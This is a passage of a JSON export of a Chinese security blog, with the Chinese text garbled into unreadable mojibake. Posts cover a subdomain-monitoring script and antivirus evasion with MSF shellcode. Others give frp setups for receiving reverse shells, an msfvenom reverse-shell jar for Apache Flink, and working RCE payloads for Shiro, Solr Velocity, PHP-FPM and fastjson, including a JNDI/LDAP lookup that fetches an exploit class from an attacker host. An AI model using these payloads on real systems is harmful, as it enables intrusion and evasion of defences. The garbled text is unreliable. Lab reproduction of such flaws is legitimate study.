‡åŸŸåæ•°æ®åº“å¯¼å‡ºçš„ä¸Šæ¬¡ç»“æœ,éœ€æ‰‹åŠ¨åˆ›å»ºå¹¶å¡«å†™æ­¤é…ç½® result_name=path+&quot;/results/&quot; #å­˜æ”¾oneforallç»“æœçš„æ–‡ä»¶å¤¹è·¯å¾„,é»˜è®¤é…ç½®å³å¯ # print f_list def result_txt(result_name): #ç”Ÿæˆç›‘æ§åŸŸåæ‰«æç»“æœçš„txtæ–‡ä»¶åå­— f_list = os.listdir(result_name) with open(&quot;result_name.txt&quot;,&quot;w&quot;) as r: for i in f_list: # os.path.splitext():åˆ†ç¦»æ–‡ä»¶åä¸æ‰©å±•å if os.path.splitext(i)[1] == '.txt': r.write(i+&quot;\\n&quot;) return True def update_domain(): #ç®€åŒ–æ–°æ—§æ‰«æç»“æœå¹¶è¿›è¡Œå¯¹æ¯”ï¼Œå‘ç°æ–°å¢åŸŸå f=open('result_name.txt','r') lines=f.readlines() f.close() for line in lines: line1=line.strip('\\n') target=line1[0:(line1.rfind('_', 1))] #è·å¾—æœ¬æ¬¡æ‰«æç›®æ ‡åŸŸå table_name=target.replace('.',&quot;_&quot;)+&quot;_now&quot; #è·å¾—ç›®æ ‡åŸŸåæ•°æ®åº“å­˜å‚¨è¡¨å print(&quot;[+] å¼€å§‹å¯¼å‡º&lt;&quot;+target+&quot;&gt;æ•°æ®åº“è®°å½•ï¼Œç”¨åšåé¢çš„å¯¹æ¯”&quot;) print(os.system(&quot;python dbexport.py --table %s --format txt --dpath %s&quot; %(table_name,old_import))) old_path=old+line1 #å­˜æ”¾ä¸Šæ¬¡åŸŸåç»“æœæ–‡ä»¶ new_path=new+line1 #å­˜æ”¾æœ¬æ¬¡åŸŸåç»“æœæ–‡ä»¶ old_result_subdomain=old_import+table_name+&quot;_subdomain.txt&quot; #å­˜æ”¾åŸŸåæ‰«æç»“æœæ–‡ä»¶ new_result_subdomain=result_name+line1 now_time = datetime.datetime.now().strftime('%Y-%m-%d') #è·å¾—å½“å‰æ—¥æœŸï¼Œä¸ºæ–°å¢åŸŸååšå‡†å¤‡ update_subdomain=update+&quot;update_&quot;+now_time+&quot;_&quot;+line1 #ä¸ºæ–°å¢åŸŸåæ–‡ä»¶èµ·ä¸ªåå­—ï¼Œé˜²æ­¢é‡å¤ f=open(old_result_subdomain, encoding=&quot;utf-8&quot;) f.close lines=f.read() pattern = re.compile(r'\\|(http.*?://.*?)[ |]') result = pattern.findall(lines) print(&quot;[+] è·å¾—&lt;&quot;+target+&quot;&gt;ä¸Šæ¬¡æ‰«æå­åŸŸåç»“æœä¸­ &quot;) with open(old_path,'w') as fopen: for subdomain_old in result: fopen.write(subdomain_old+&quot;\\n&quot;) print(&quot;[+] å¼€å§‹æ‰«æå­åŸŸå,æ—¶é—´è¾ƒé•¿ï¼Œè¯·è€å¿ƒç­‰å¾…...&quot;) os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target) #print(&quot;[+]å½“å‰ç›‘æ§åŸŸå:&quot;+target+&quot;[+]&quot;+os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target)) f=open(new_result_subdomain, encoding=&quot;utf-8&quot;) f.close lines=f.read() pattern = re.compile(r'\\|(http.*?://.*?)[ |]') result = pattern.findall(lines) print(&quot;[+] æ‰«æå®Œæˆï¼Œè·å¾—&lt;&quot;+target+&quot;&gt;æœ€æ–°æ‰«æå­åŸŸåç»“æœä¸­ &quot;) with open(new_path,'w') as fopen: for subdomain_new in result: fopen.write(subdomain_new+&quot;\\n&quot;) print(&quot;[*] å¼€å§‹æ£€æµ‹&lt;&quot;+target+&quot;&gt;åŸŸåæ˜¯å¦æ–°å¢...&quot;) str1 = [] file_1 = open(old_path,&quot;r&quot;,encoding=&quot;utf-8&quot;) print(&quot;[+] å·²æ‰“å¼€old_domainå­˜å‚¨çš„ä¸Šæ¬¡æ‰«æç»“æœï¼š&quot;+line1+&quot;æ–‡ä»¶ï¼Œå¼€å§‹è·å–åŸŸåå¹¶å­˜å…¥æ•°ç»„old&quot;) for line in file_1.readlines(): str1.append(line.replace(&quot;\\n&quot;,&quot;&quot;)) str2 = [] file_2 = open(new_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) print(&quot;[+] å·²æ‰“å¼€new_domainå­˜å‚¨çš„æœ¬æ¬¡æ‰«æç»“æœï¼š&quot;+line1+&quot;æ–‡ä»¶ï¼Œå¼€å§‹è·å–åŸŸåå¹¶å­˜å…¥æ•°ç»„new&quot;) for line in file_2.readlines(): str2.append(line.replace(&quot;\\n&quot;, &quot;&quot;)) str_dump = [] print(&quot;[+] æ­£åœ¨å¯¹æ¯”æ•°ç»„è·å¾—æ–°å¢åŸŸåä¸­&quot;) for line in str2: if line not in str1: str_dump.append(line) #å°†ä¸¤ä¸ªæ–‡ä»¶é‡å¤çš„å†…å®¹å–å‡ºæ¥ if len(str_dump) &lt; 1: print(&quot;[+] æ£€æµ‹å®Œæˆï¼Œä¸å­˜åœ¨æ–°å¢åŸŸåï¼Œè¯·ç­‰å¾…ä¸‹ä¸€å‘¨æœŸæ£€æµ‹ï¼&quot;) else: print(&quot;[+] æ£€æµ‹å®Œæˆï¼Œå­˜åœ¨æ–°å¢åŸŸå:&quot;+&quot;\\n&quot;) for str in str_dump: #å»é‡åçš„ç»“æœå†™å…¥æ–‡ä»¶ print(&quot; &quot;+str) with open(update_subdomain,&quot;a+&quot;,encoding=&quot;utf-8&quot;) as f: f.write(str + &quot;\\n&quot;) num=len(str_dump) number=num*900 min=num*30 print(&quot;\\n&quot;+&quot;[+] &quot;+&quot;æœ¬æ¬¡æ–°å¢%s&quot;%num +&quot;ä¸ªåŸŸåï¼Œå°†ç­‰å¾…%s&quot;%min+&quot;åˆ†é’Ÿåæ‰§è¡Œä¸‹æ¬¡ä»»åŠ¡&quot;) if __name__ == '__main__': result_txt(result_name) update_domain() 0x03 è¿è¡Œå‰æ 1.é…ç½®å¥½ä»£ç é‡Œçš„ç»å¯¹è·¯å¾„ï¼Œåˆ›å»ºå¥½æ–‡ä»¶å¤¹ï¼Œä¿è¯åç§°æ— è¯¯ï¼ŒOne_Monitor.pyæ”¾åœ¨å’Œonforall.pyåŒä¸€è·¯å¾„ä¸‹è¿è¡Œ 2.é¦–å…ˆå¯¹æƒ³ç›‘æ§çš„åŸŸåç”¨oneforallæ‰«ä¸€éï¼Œç»“æœä¸ºtxtæ ¼å¼ 3.æˆ‘è®¾ç½®äº†ä¸€ä¸ªåŸŸå30åˆ†é’Ÿçš„å»¶è¿Ÿï¼Œå› ä¸ºæ˜¯å®æ—¶æ¼æ‰«ï¼Œç»™ç•™çš„æ—¶é—´ï¼Œä¸éœ€è¦å¯ä»¥åˆ æ‰ 4.åº”è¯¥æ²¡å•¥äº†ï¼Œä»£ç ç°å¸¸ç®€å•ï¼Œæœ‰é—®é¢˜ä¸€çœ‹å°±çŸ¥é“çš„ï¼Œæœ‰é—®é¢˜å¯ä»¥äº¤æµã€‚è¿˜å¸Œæœ›æœ‰äººä¹Ÿèƒ½åˆ†äº«æˆ‘ä¸€ä¸ªä»£ç ç®€å•ä½†å®ç”¨çš„è„šæœ¬ï¼ˆé™„ä¸€ä¸ªæµ‹è¯•å›¾ï¼Œæ˜¯è®¡åˆ’ä»»åŠ¡å¯åŠ¨çš„ï¼Œæ‰€ä»¥æ˜¯ç™½æ¿ï¼‰ ","link":"https://www.svenbeast.com/post/-y8PKMNR2/"},{"title":"è®°å½•ä¸€æ¬¡å…æ€çš„ç²—é„™æ“ä½œ(MSF+shellcode+æŸæ€æ¯’)","content":"0x01 èƒŒæ™¯ Â·Â·Â·Â·Â·Â·Â·Â·Â· Â·Â·Â·Â·Â·Â·Â·Â·Â· Â·Â·Â·Â·Â·Â·Â· åšä¸€ä¸ªè®°å½•~ Â·Â·Â·Â·Â·Â· Â·Â·Â·Â· Â·Â·Â·Â· 0x01 ç¯å¢ƒ ä¸´æ—¶å…¬ç½‘vbsä¸€ä¸ªï¼š94.191.125.65 ç›®æ ‡æœºï¼šWindows2016å¹¶å®‰è£…å¥½360+ç«ç»’(æˆªæ­¢åˆ°2020Â·1Â·22ç—…æ¯’åº“) æ”»å‡»æœºï¼šwindwos10 è¯­è¨€ç¯å¢ƒï¼š 0x02 å¤§æ¦‚è¿‡ç¨‹ 1.åœ¨VBSä¸Šå¼€å¯frpï¼Œä½¿MSFæ‹¥æœ‰å…¬ç½‘ip 2.ç”Ÿæˆshellcodeï¼ˆ94.191.125.65ï¼Œ4446ï¼‰ 3.shellcodeåŠ è½½å™¨è¿è¡Œæ”¶shell 0x03 ç»“æœ 1.è™½ç„¶æ˜¯è€æ–¹æ³•ï¼Œä¸è¿‡èƒœåœ¨æ¯”è¾ƒè‡ªç”±ï¼ˆgifåŠ è½½ä¸­...ï¼‰(ä¹Ÿå¯ä»¥shellcodeæ”¾åœ¨å…¬ç½‘è¿›è¡Œè¯·æ±‚ï¼Œè‹¥è¢«æ€å¯ä»¥å¯¹ä»£ç é‡æ–°è¿›è¡Œå…¶ä»–ç¼–ç å¤„ç†) ","link":"https://www.svenbeast.com/post/tSl508OMg/"},{"title":"è·¨å¹´è¯¶ï¼Œphpcmsåå°getshell","content":" ç»†èŠ‚åœ¨toolsé‡Œï¼Œæˆ‘å°±æ˜¯è¿‡å¹´ä¸çŸ¥é“å‘å•¥ï¼Œå¤§æ™šä¸Šé‚£å°±å¤ç°ä¸€ä¸‹å§ã€‚ã€‚å§ã€‚ï¼ˆæŠ¢åˆ°ä¸ªäº‘æ‚‰é‚€è¯·ç ï¼Œå¼€æ£®ï¼‰ ","link":"https://www.svenbeast.com/post/XzA6X7QIp/"},{"title":"kaliè½¬å‘å…¬ç½‘+è¿‡æ€æ¯’+é…åˆmsfå…¥ä¾µwindows7","content":"0x01 æ­¤ç¯‡ä¸ºä¸ªäººè®°å½• å·¥å…·äººä¸€æšï¼Œ å°±ä¼šç»„åˆæ“ä½œï¼Œ èœæ˜¯åŸç½ªã€‚ 0x02 é…ç½®frpï¼Œä½¿kaliæ¥å—å…¬ç½‘shell é…ç½®å†…å®¹ï¼š å…¬ç½‘windowsçš„frps.inié…ç½®å†…å®¹ [common] bind_port = 7000 dashboard_port = 7500 dashboard_user = admin dashboard_pwd = admin è™šæ‹Ÿæœºkaliæœºçš„frpc.inié…ç½®å†…å®¹ [common] server_addr = 129.28.191.182 //é„™äººçš„å…¬ç½‘ip server_port = 7000 [msf] type = tcp local_ip = 127.0.0.1 local_port = 6666 remote_port = 4446 * å‘½ä»¤æŒ‰é¡ºåºæ’åºï¼š ./frps -c frps.ini &gt; log.txt &amp; //å…¬ç½‘windowså¼€å¯frp ./frpc -c frpc.ini &gt; log.txt &amp; //è™šæ‹Ÿæœºkaliå¼€å¯frp åé—¨è®¾ç½®ï¼šlhsotï¼š129.28.191.182 lport:4446 0x03 shellterç”Ÿæˆåé—¨ å°è¯•è¿‡å¤šç§æ–¹æ³•ï¼Œæœ€åå‘ç°è¿™ä¸ªæ¯”è¾ƒé¦™ï¼ˆç›®æ ‡æœºå™¨ä¸º*60æ—¶ï¼Œå¯ç”¨ï¼‰ 0x04 åœ¨Win7çš„*60å¥—é¤ä¸­è·å¾—meterpreter ä¸‹æ¬¡è”åŠ¨csï¼Œä½œä¸ºwebç‹—å¾—æ…¢æ…¢æ¥ -.-! ","link":"https://www.svenbeast.com/post/RD6ZQ1MX_/"},{"title":"java RMIååºåˆ—åŒ–æ— å«é‡è®°å½•","content":" è¯†åˆ«ç«¯å£ç±»å‹ä¸ºjava RMIæ—¶ï¼Œå°è¯•åˆ©ç”¨æ­¤æ¼æ´ å‚è€ƒé“¾æ¥ï¼šhttps://www.freebuf.com/vuls/126499.html ","link":"https://www.svenbeast.com/post/TWAepnjZi/"},{"title":"windwosææƒ-CVE-2019-1388","content":"æ„Ÿè§‰æ‰“å¼€æ–°å¤§é—¨ï¼Ÿï¼Ÿ https://github.com/sv3nbeast/CVE-2019-1388 0x00 æ‰‹åŠ¨è¿‡ç¨‹ ","link":"https://www.svenbeast.com/post/OsMblUp6w/"},{"title":"Shiro<=1.4.1 padding oracle attackå¯¼è‡´RCE","content":"0x01 èƒŒæ™¯ shiroæ˜¯ä¸€ä¸ªjavaåœºæ™¯ä½¿ç”¨è¾ƒå¤šç»„ä»¶ï¼Œæœ€è¿‘æ›å‡ºå› ä½¿ç”¨äº† AES-128-CBC æ¨¡å¼å¯¹cookieè¿›è¡ŒåŠ å¯†ï¼Œsoå¯ ä»¥padding oracleæ”»å‡»æ„é€ æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ”»å‡» å½±å“ç‰ˆæœ¬ï¼š 1.2.4&lt;shiro&lt;=1.4.1 0x02 ç¯å¢ƒ é¶æœºï¼šwindows10 + tomcat + shiro1.4.1 shiroç¯å¢ƒï¼šhttps://pan.baidu.com/s/1E72vhls9oOI-ny4luDTi3A æå–ç : uakn æ”»å‡»æœºï¼šwindows10 + burpsuite + python Expï¼šhttps://xxx.com 0x03 å¤ç° 1.é¶æœºshiroç¯å¢ƒæ­£å¸¸æ˜¾ç¤º 2.ç™»å½• 3.ç”Ÿæˆpayload.class java -jar ysoserial.jar CommonsCollections1 &quot;ping dnslog.com&quot; &gt; payload.class 4.å–cookieçš„rememberMeå€¼ 5.ç”Ÿæˆæ¶æ„rememberMeå€¼ éœ€è¾“å…¥3ä¸ªå‚æ•°ï¼Œç›®æ ‡urlï¼Œæ­£å¸¸rememberMeå€¼ï¼Œpayload.classï¼Œæˆ‘è·‘äº†åº”è¯¥æ˜¯20åˆ†å·¦å³ï¼Œå…·ä½“æ²¡çœ‹ &gt;&gt;python2 shiro_exp.py http://172.20.10.3:8080/shiro-1.4.1/home.jsp rememberMeå€¼ payload.class 6.ä½¿ç”¨ç”Ÿæˆçš„æ¶æ„rememberMeå€¼è¿›è¡Œè®¿é—® PSï¼šæ­¤å¤„è®¿é—®éœ€è¦å…ˆé€€å‡ºåˆšæ‰çš„ç™»å½•ï¼Œåœ¨æœªç™»å½•æƒ…å†µä¸‹ä½¿ç”¨æ¶æ„remeberMeè¿›è¡Œè®¿é—®ï¼Œç”±æ­¤æ‰å¯é€ æˆRCE åŒæ—¶ä¹Ÿå¯ç†è§£ä¸ºï¼Œè·å¾—ä¸€æ¬¡ä»»æ„ç™»å½•åå¾—remeberMeå€¼åï¼Œä»¥åå†åˆ©ç”¨åˆ™æ— éœ€è·å–æ–°çš„å€¼,æƒ³è¦æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œç»§ç»­ä½¿ç”¨åˆå§‹çš„remeberMeå€¼è¿›è¡Œéå†ã€‚ 0x04 å‘ç‚¹ 1.è€—è´¹æ—¶é—´ 2.éœ€è¦æ³¨é”€åè¿›è¡Œæ³¨å…¥æ¶æ„rememberMeè®¿é—®ï¼Œå·®ç‚¹è‡ªé—­ï¼Œæ¯•ç«Ÿæ— å‚è€ƒä¸”æ²¡äººæè¿‡ï¼Œæˆ–è€…æˆ‘å§¿åŠ¿ä¸å¯¹ï¼Ÿï¼Ÿ 3.å‹æƒ…æç¤ºä¸è¦ç”¨linuxè™šæ‹Ÿæœºå½“åšé¶æœºè¿›è¡Œéå†ï¼Œè™šæ‹Ÿæœºä¼šå†…å­˜çº¢è‰²å‘Šæ€¥ï¼Œå¯ä»¥å…ˆå¿«ç…§è¯•è¯•ï¼Œä¸è¿‡ä¸ä¸€å®šç®¡äº‹ ï¼ˆé»˜é»˜è¶…å¿ƒç—›æˆ‘çš„kaliæœºï¼Œ-.-!ï¼‰ ","link":"https://www.svenbeast.com/post/-leT8b8Kh/"},{"title":"Apache_Flinkä»»æ„jaråŒ…ä¸Šä¼ å¯¼è‡´RCE","content":"0x00 å½±å“ç‰ˆæœ¬ ç›®å‰æœ€æ–°ç‰ˆæœ¬Apache Flink 1.9.1 ç”ŸæˆjaråŒ… msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;test.jar ç›‘å¬å¹¶ä¸Šä¼  shell psï¼šæ— è¯(f**k)å¯è¯´ ","link":"https://www.svenbeast.com/post/GJfB5twey/"},{"title":"å­¦ä¹ ä½¿æˆ‘å¿«ä¹","content":"æ™“ å¤äººå­¦é—®æ— é—åŠ›ï¼Œå°‘å£®å·¥å¤«è€å§‹æˆã€‚çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚ å°‘å¹´æ˜“è€å­¦éš¾æˆï¼Œä¸€å¯¸å…‰é˜´ä¸å¯è½»ã€‚æœªè§‰æ± å¡˜æ˜¥è‰æ¢¦ï¼Œé˜¶å‰æ¢§å¶å·²ç§‹å£°ã€‚ æ˜æ—¥å¤æ˜æ—¥ï¼Œæ˜æ—¥ä½•å…¶å¤šï¼æˆ‘ç”Ÿå¾…æ˜æ—¥ï¼Œä¸‡äº‹æˆè¹‰è·ã€‚ä¸–äººè‹¥è¢«æ˜æ—¥ç´¯ï¼Œ æ˜¥å»ç§‹æ¥è€å°†è‡³ã€‚æœçœ‹æ°´ä¸œæµï¼Œæš®çœ‹æ—¥è¥¿å ï¼Œç™¾å¹´æ˜æ—¥èƒ½å‡ ä½•ï¼Ÿè¯·å›å¬æˆ‘ã€Šæ˜æ—¥æ­Œã€‹ ç»§ç»­æ·±å…¥å­¦ä¹ ä»£ç å®¡è®¡ ps:ä¸ºä»€ä¹ˆåˆ«äººçš„0dayåƒç‚’åœŸè±†ä¸é‚£ä¹ˆç®€å•ï¼Œæˆ‘çš„å°±åƒåšæ»¡æ±‰å…¨å¸­ğŸŠâ€â™€ ","link":"https://www.svenbeast.com/post/i3isd2Yq0/"},{"title":"Apache Solr Velocityè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨","content":"0x01 æè¿° æ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹åˆ©ç”¨è¯¥æ¼æ´ï¼Œè¿œç¨‹å‘é€ç²¾å¿ƒæ„é€ çš„HTTPè¯·æ±‚ï¼Œä»è€Œåœ¨å—å½±å“æœåŠ¡å™¨ä¸Šè¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ 0x02 èŒƒå›´ Apache Solr 5.xè‡³8.xç‰ˆæœ¬ 0x03 å¤ç° 1.è·å–path 2.æ›´æ”¹è®¾ç½® POC ä½¿ç”¨åˆšæ‰çš„pathæ›¿æ¢è·¯å¾„çš„test POST /solr/test/config HTTP/1.1 Host: 192,168.1.1:8983 Content-Type: application/json Content-Length: 263 { &quot;update-queryresponsewriter&quot;: { &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; } } 3.å‘½ä»¤æ‰§è¡Œ POC ä½¿ç”¨åˆšæ‰çš„pathæ›¿æ¢è·¯å¾„çš„test GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: 192.168.1.1:8983 Content-Type: application/json Content-Length: 263 0x04 åå¼¹shell 1.å¯¹bashå‘½ä»¤è¿›è¡Œruntimeç¼–ç ï¼Œåœ¨è¿›è¡Œurlç¼–ç ï¼Œå³å¯æˆåŠŸåå¼¹ 2.æˆåŠŸåå¼¹åˆ°vbs 0x05 ä¿®å¤ å®˜æ–¹æš‚æœªå‘å¸ƒï¼Œå¯å…³æ³¨å®˜ç½‘è·å–è¡¥ä¸æˆ–ç‰ˆæœ¬æ›´æ–°ï¼šhttp://lucene.apache.org/solr/ ","link":"https://www.svenbeast.com/post/QmuCuXJa9/"},{"title":"Nginxçš„PHP-FPMè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","content":"0x01 èƒŒæ™¯ åœ¨9 æœˆ 14 æ—¥è‡³ 18 ä¸¾åŠçš„ Real World CTF ä¸­ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶å‘˜ Andrew Danau åœ¨è§£å†³ä¸€é“ CTF é¢˜ç›®æ—¶å‘ç°ï¼Œ å‘ç›®æ ‡æœåŠ¡å™¨ URL å‘é€ %0a ç¬¦å·æ—¶ï¼ŒæœåŠ¡è¿”å›å¼‚å¸¸ï¼Œç–‘ä¼¼å­˜åœ¨æ¼æ´ã€‚ Nginx ä¸Š fastcgi_split_path_info åœ¨å¤„ç†å¸¦æœ‰ %0a çš„è¯·æ±‚æ—¶ï¼Œä¼šå› ä¸ºé‡åˆ°æ¢è¡Œç¬¦ \\n å¯¼è‡´ PATH_INFO ä¸ºç©ºã€‚ è€Œ php-fpm åœ¨å¤„ç† PATH_INFO ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå­˜åœ¨é€»è¾‘ç¼ºé™·ã€‚ æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒçš„æ„é€ å’Œåˆ©ç”¨ï¼Œå¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ æ¼æ´ç¼–å·ï¼šCVE-2019-11043 æ¼æ´ PoC åœ¨ 10 æœˆ 22 æ—¥å…¬å¼€ã€‚ 0x02 å½±å“èŒƒå›´ Nginx + php-fpmçš„æœåŠ¡å™¨ï¼ˆphp&gt;5.6ï¼‰ï¼Œåœ¨ä½¿ç”¨å¦‚ä¸‹é…ç½®çš„æƒ…å†µä¸‹ï¼Œéƒ½å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ location ~ [^/]\\.php(/|$) { fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; } } 0x03 ç¯å¢ƒæ­å»º é¶æœºï¼šubuntuï¼Œ Vulhubï¼Œdocker å‘½ä»¤é›†åˆ mkdir CVE-2019-11043 cd CVE-2019-11043/ wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml mkdir www cd www/ wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php cd ../ service docker start sudo docker-compose up -d è®¿é—® http://é¶æœºip:8080/index.php 0x04 æ¼æ´åˆ©ç”¨ pocæ˜¯ä½¿ç”¨goè¯­è¨€ç¼–å†™çš„ï¼Œè¿™é‡Œå·²ç»ç¼–è¯‘å¥½exeï¼Œæä¾›ä¸‹è½½ é“¾æ¥: https://pan.baidu.com/s/1bbV15sw-Yx-PX3LFIE2ggA æå–ç : sven usageï¼šphuip-fpizdam.exe http://192.168.43.21:8080/index.php æœ‰goè¯­è¨€ç¯å¢ƒçš„å¯ä»¥ç›´æ¥è¿è¡Œ git clone https://github.com/neex/phuip-fpizdam.git cd phuip-fpizdam go run . &quot;http://your-ip:8080/index.php&quot; pocè¿è¡Œå®Œæ¯•åå¯ä»¥ç›´æ¥è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œ?a=whoami usage:è¾“å…¥å‘½ä»¤åï¼Œéœ€è¦å¤šæ‰§è¡Œå‡ æ¬¡åˆ·æ–°ï¼Œä»¥è®¿é—®åˆ°è¢«æ±¡æŸ“çš„è¿›ç¨‹ã€‚ index.phpæºç  0x05 æ¼æ´æˆå›  å› ä¸ºâ€œfpm_main.câ€æ–‡ä»¶çš„ç¬¬1150è¡Œä»£ç ä¸­ç”±äº\\n(%0a)çš„ä¼ å…¥å¯¼è‡´nginxä¼ é€’ç»™php-fpmçš„PATH_INFOä¸ºç©ºã€‚ https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150 è¿›è€Œå¯¼è‡´å¯ä»¥é€šè¿‡FCGI_PUTENVä¸PHP_VALUEç›¸ç»“åˆï¼Œä¿®æ”¹å½“å‰çš„php-fpmè¿›ç¨‹ä¸­çš„phpé…ç½®ã€‚åœ¨ç‰¹æ®Šæ„é€ çš„é…ç½®ç”Ÿæ•ˆçš„æƒ…å†µä¸‹å¯ä»¥è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œã€‚ ","link":"https://www.svenbeast.com/post/dyp738nRt/"},{"title":"fastjson<=1.2.47ååºåˆ—åŒ–æ¼æ´å¤ç°","content":"0x01 èƒŒæ™¯ åŠªåŠ›å­¦ä¹ ing~ ä¸ºä»¥åé‡åˆ°javaç¯å¢ƒå¢åŠ æµ‹è¯•é¡¹åšå‡†å¤‡ï¼Œé˜²æ­¢ä¸€è„¸æ‡µé€¼æƒ…å†µå‘ç”ŸğŸ™€ï¼Œä¸€èˆ¬åˆ°æ—¶å†çœ‹ä¸ºæ—¶å·²æ™šï¼Œsoå…ˆä¸‹æ‰‹ä¸ºå¼ºğŸ˜‡ã€‚ 0x02 ç½‘ç»œç¯å¢ƒ æ”»å‡»æœºï¼š os:windows10 æœåŠ¡å™¨ï¼š os:kaliè™šæ‹Ÿæœºï¼Œip:192.168.124.55ï¼Œjdkç‰ˆæœ¬:jdk8u181ï¼Œä¸­é—´ä»¶:tomcat9 ç›®æ ‡æœºï¼š os:ubuntuè™šæ‹Ÿæœºï¼Œipï¼š172.21.139.103ï¼Œä¸­é—´ä»¶ï¼štomcat9ï¼Œjdkç‰ˆæœ¬:jdk8u181 0x03 ç¯å¢ƒæ­å»º unbutu&amp;kaliå®‰è£…jdkï¼šjdk8u181 é“¾æ¥: https://pan.baidu.com/s/1nI-JT93vjcA9--7fb0fhqw&amp;shfl=shareset æå–ç : sven tomcatä¸‹è½½ï¼šhttps://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.tar.gz fastjson1.2.47ï¼š é“¾æ¥: https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset æå–ç : sven å·¥å…·ï¼šmarshalsecï¼Œéœ€è¦ç”¨mvnæ‰“åŒ…ä¸€ä¸‹ï¼Œgithubï¼šhttps://github.com/mbechler/marshalsec é“¾æ¥(å·²æ‰“åŒ…å¥½): https://pan.baidu.com/s/1kT9vwhNDDdiJ3dL9BS3U4w&amp;shfl=shareset æå–ç : sven mvnæ‰“åŒ…æˆªå›¾åŠä½¿ç”¨å‘½ä»¤ ç»†èŠ‚é…ç½®å°±ä¸è¯´äº†ï¼Œå¤§æ¦‚å°±æ˜¯æœåŠ¡å™¨å¼€å¯ldapå¹¶é…ç½®webèƒ½è®¿é—®åˆ°expï¼Œé¶æœºå®‰è£…å¥½jdkæ”¾å…¥fastjsonç¯å¢ƒï¼Œç„¶åæ”»å‡»æœºä½¿ç”¨pocè¿›è¡Œè¯·æ±‚ï¼Œå®Œäº‹ è®¿é—®é¶æœºç•Œé¢ï¼š 0x04 æ¼æ´åˆ©ç”¨ Exploit: import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(&quot;touch /tmp/fastjson.test&quot;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 1.ç¼–è¯‘ä¸€ä¸‹Exploit.java,ç”ŸæˆExploit.classï¼Œå°†2ä¸ªæ–‡ä»¶æ”¾å…¥æœåŠ¡å™¨webapps/fastjsonä¸‹ 2.æœåŠ¡å™¨ä½¿ç”¨marshalsecå¼€å¯ldapæœåŠ¡ï¼š java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.124.55:8080/fastjson/#Exploit 8088 3.æŸ¥çœ‹ä¸€ä¸‹é¶æœºæºç ï¼Œå‘ç°å‚æ•°nameå’Œageï¼Œæ„é€ ä¸€ä¸‹ï¼Œå›æ˜¾æ­£å¸¸ï¼Œ ps:çœŸå®ç¯å¢ƒä¸­è¿™äº›éƒ½æ˜¯ç›®æ ‡æœºè‡ªå¸¦çš„ï¼Œæ‰¾åˆ°æäº¤jsonçš„åœ°æ–¹æ„é€ pocå³å¯ 4.æ”¾ä¸Špocï¼ŒæŸ¥çœ‹é¶æœºæ˜¯å¦æˆåŠŸæ‰§è¡Œå‘½ä»¤ POST /fastjson/ HTTP/1.1 Host: 192.168.124.34:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 256 { &quot;name&quot;: { &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;x&quot;: { &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://192.168.124.55:8088/fastjson/Exploit&quot;, 